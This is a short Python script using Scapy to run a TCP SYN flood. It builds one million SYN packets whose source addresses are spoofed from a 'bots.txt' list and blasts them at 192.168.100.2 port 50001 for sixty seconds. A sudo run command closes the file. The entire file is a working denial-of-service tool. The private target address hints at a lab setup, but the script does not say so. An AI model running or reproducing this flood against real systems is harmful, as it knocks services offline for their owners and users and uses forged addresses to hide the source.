from scapy.all import *
import scapy
import random
import time
import sys
import ipaddress
import threading

# Scapy TCP SYN Flood (60 seconds)
TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "../bots.txt"
NUM_PACKETS = 1000000
SEND_DURATION = 60

def load_bots(filename):
    bot_ips = []

    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)

    return bot_ips

def test(packet_list):
    sendpfast(packet_list, iface="enp3s0", file_cache=True)

def run_tcp_flood_attack():
    """TCP SYN Flood Attack"""
    bot_ips = load_bots(BOTFILE)

    numero_de_pacotes_enviados = 0

    lista_de_pacotes = []

    start_build = time.perf_counter()
    while True:
        source_ip = random.choice(bot_ips)

        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        seq_num = random.randint(0, 4294967295)
        tcp_layer = TCP(sport=RandShort(),dport=TARGET_PORT, flags='S', seq=seq_num, window=8192)


        packet = eth_layer / ip_layer / tcp_layer 

        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if(numero_de_pacotes_enviados == NUM_PACKETS):
            break

    end_build = time.perf_counter()
    build_duration = end_build - start_build

    print(f"\nPacket creation completed.")
    print(f"Time to build packets: {build_duration:.4f} seconds")

    print(f"\nSending packets for {SEND_DURATION} seconds...")

    thread = threading.Thread(target=test(lista_de_pacotes))
    thread.start()

    time.sleep(SEND_DURATION)

    exit(0)

if __name__ == "__main__":
    run_tcp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 scapy_test_tcp_syn_flood.py